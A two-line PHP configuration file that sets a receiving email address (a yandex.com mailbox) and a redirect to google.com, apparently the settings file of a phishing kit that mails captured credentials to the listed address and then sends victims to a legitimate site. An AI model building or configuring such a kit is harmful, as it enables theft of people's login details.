<?php 
$Receive_email="mariotomie@yandex.com";
$redirect="https://www.google.com/";
?>